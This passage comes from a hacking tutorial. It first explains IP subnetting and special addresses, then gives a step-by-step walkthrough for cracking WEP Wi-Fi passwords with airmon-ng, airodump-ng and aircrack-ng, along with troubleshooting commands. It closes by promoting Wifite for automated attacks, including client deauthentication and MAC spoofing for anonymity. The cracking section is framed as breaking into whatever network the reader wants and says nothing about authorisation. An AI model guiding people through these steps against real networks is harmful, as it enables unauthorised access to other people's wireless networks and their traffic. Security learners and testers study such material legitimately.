- fmt: '

    Now suppose you want to divide your network into parts. It is the sub-networks
    that are known as subnets (it is correct to call them subnetwork as well).


    We''ll jump right to it, consider the netmask `M`:


    ```

    M = 11111111.11111111.11111111.11000000

    ```


    ![](Images/image00038.jpeg)


    Now, the first 3 octets describe the network. But the 4th octet, which is supposed
    to be for the host, has the 2 most significant bits (i.e. leftmost bits) as 1.
    Thus, the 2 most significant (leftmost) bits of the 4th octet will show up when
    we carry out the bitwise AND operation. They will, thus, be a part of the network
    address. However, they belong to the host octet. Thus, these 2 bits, which belong
    to the host octet but show up in the network IP address divide the network into
    subnets. The 2 bits can represent 4 possible combinations, 00, 01, 10 and 11,
    and hence the network will have 4 subnets.


    ### Example of Subnetwork


    Back to our previous "A",


    ```

    A   = 11000000.10101000.00000001.xx000001 (192.168.1.1)

    M   = 11111111.11111111.11111111.11000000 (255.255.255.192)

    A&M = 11000000.10101000.00000001.xx000000 (192.168.1.0)

    ```


    Earlier, irrespective of what was there in 4th octet of `A`, we would have got
    all 0s in 4th octet of `A&M` i.e. network address. This time we will get the 2
    most significant bits in the network address. Four subnets will be formed depending
    on the value of `xx` (which can be 00,01,10 or 11). Now, we will see which subnet
    has which set of hosts.


    #### Which subnet has which hosts:


    - `11000000.10101000.00000001.00000000` (Images/image00038.jpeg) has hosts `192.168.1.0-63`
    (00000000 to 00111111)

    - `11000000.10101000.00000001.01000000` has hosts `192.168.1.64-127` (01000000
    to 01111111)

    - `11000000.10101000.00000001.10000000` has host `192.168.1.128-191` (10000000
    to 10111111)

    - `11000000.10101000.00000001.11000000` has host `192.168.1.192-255` (11000000
    to 11111111)


    So the netmask `M` divided the network into 4 equal subnets with 64 hosts each.
    There are some subnets which are much more complicated and have their applications
    in certain specific areas. I recommend going through Wikipedia page on Subnetworks
    to get some more idea.


    ### Some Special IPs


    - `0.0.0.0` = All IPs on local machine. Anything hosted on this IP is available
    to all devices on the network.

    - `127.0.0.1` = LocalHost, this loops back to the machine itself.

    - `255.255.255.255` = Broadcast, anything sent to this IP is broadcasted (like
    radio is broadcasted to everyone) to all hosts on the network.


    ![](Images/image00038.jpeg) **32**


    ### Conclusion


    This way of representing subnets using `/24`, `/25`, `/26`, etc. is quite useful
    while doing vulnerability scans on networks (using `nmap`, etc.). `/24` represents
    the netmask `255.255.255.0`, the first example we took of Wireless router. It
    is the most common configuration you''ll use while doing `nmap` scan. The one
    we discussed later, in the subnets section, is `/26`. It has 4 subnetworks. `/25`
    has 2 subnets. `/27` has 8. `/31` has 128 subnets! In this subnet, only 2 host
    can be there per network, and it is used for 1 to point point links. I hope the
    next time you have to deal with networks, won''t having difficulties. There are
    topic like Multicast which build up on this, and you can do further reading on
    them.


    ![](Images/image00038.jpeg)


    # 4 Wifi Hacking - WEP


    #### 1. Name of your wireless adapter


    Alright, now your computer has many network adapters, so to scan one you need
    to know its name. So there are basically the following things you need to know:

    - `lo` - loopback. Not important.

    - `eth` - ethernet

    - `wlan` - this is what we want. Note the suffix. Now, to see all adapters, type
    `ifconfig` on terminal. See the result. Note down `wlan0/1/2` adapter: (image0040.jpeg)


    #### 2. Enable Monitor mode


    (image0038.jpeg) We are going to use tool called `airmon-ng` to create virtual
    interface called `mon`. Just type:


    ```bash

    airmon-ng start wlan0

    ```


    Your monitoring interface will be created - `mon0` in case of Kali 1.x, `wlan0mon`
    in all other cases.


    #### 3. Start capturing packets


    Now we''ll use `airodump-ng` to capture the packets in the air. This tool gathers
    data from wireless packets in the air. You''ll see the name of wifi you want to
    hack. For kali 2.0 or rolling, replace `mon0` with `wlan0mon`:


    ```bash

    airodump-ng mon0

    ```


    (Images/image0038.jpeg) **36**


    #### 4. Store the captured packets in a file


    This can be achieved by giving more parameters with `airodump-ng`. For Kali 2.0
    or rolling, replace `mon0` with `wlan0mon`:


    ```bash

    airodump-ng mon0 --write name_of_file

    ```


    (Images/image0038.jpeg) Now the captured packets will be stored in `name_of_file.cap`.
    You will have to wait till you have enough data (10000 minimum). PS: Don''t wait
    long for this step though. Just understand how procedure works (including the
    next sections), and once you are convinced you are doing, proceed to the next
    tutorial where we use ARP replay to speed up the rate at which we get packets.
    Using 10k packets in a few minutes.


    #### 5. Crack the wifi


    If all goes well, you''ll be sitting in front of your pc, finally you''ve got
    10000 packets (don''t stop the packet capture yet). Now you can use `aircrack-ng`
    to crack the password in a new terminal:


    ```bash

    aircrack-ng name_of_file-01.cap own```


    The program will ask which wifi to crack, if multiple are available. Choose the
    wifi. It''ll do its job. If the password is weak enough, then you''ll get it in
    front of you. If not, the program will tell you to get more packets. The program
    will retry again when there are 15000 packets, and so on. You''ll get the key,
    probably in this format: `xx:xx:xx:xx:xx`. Remove the colons, `xxxxxxxxxx` is
    the password of the wireless network.


    **Not working?**


    Try this:

    ```bash

    ifconfig wlan0 up

    ifconfig wlan0 down

    airmon-ng check kill

    rfkill unblock all

    ```

    or this:

    ```bash

    ifconfig wlan0mon down

    iwconfig wlan0mon mode monitor

    ifconfig wlan0mon up

    ```


    **Disconnected from internet (wifi)?**


    Replace `mon0` with `wlan0mon` for Kali 2.0 or rolling:


    ```bash

    airmon-ng stop mon0

    ```


    This is usually sufficient. If `wlan0` is not up (check `ifconfig` or `iwconfig`),
    then do this (if you don''t know what to do, then do this anyway):


    ```bash

    ifconfig wlan0 up

    ```


    If wifi still doesn''t start, try this too:


    ```bash

    service network-manager restart

    ```


    ### EXTRAS: Wifite


    - Sorts targets by signal strength (in dB); cracks closest access points first.

    - Automatically de-authenticates clients of hidden networks to reveal SSIDs.

    - Numerous filters to specify exactly what to attack (wep/wpa/both, above certain
    signal strengths, channels, etc).

    - Customizable settings (timeouts, packets/sec, etc).

    - "Anonymous" feature; changes MAC to a random address before attacking, then
    changes back when attacks are complete.

    - All captured WPA handshakes are backed up to `wifite.py`''s current directory.

    - Smart WPA de-authentication; cycles between all clients and broadcast deauths.

    - Stop any attack with `Ctrl+C`, with options to continue, move onto next target,
    skip to cracking, or exit.

    - Displays session summary at exit; shows any cracked keys.

    - All passwords saved to `cracked.txt`.

    - Built-in updater: `./wifite.py -upgrade`.


    I find it worth mentioning here, that not only does it hack wifi the easy way,
    it also hacks in the best possible way. For example, when you are hacking a WEP
    wifi using Wifite, it uses fake `auth` and uses the ARP method to speed up data
    packets.


    ### Hacking WEP network


    If you''ve followed my previous posts on Hacking Wifi (WEP), you know there''s
    a lot of homework you have to do before you even start hacking. But not here.
    With Wifite, its as easy and simple as a single command:


    ```bash

    wifite -wep

    ```


    You might even have used the command


    ```bash

    wifite

    ```

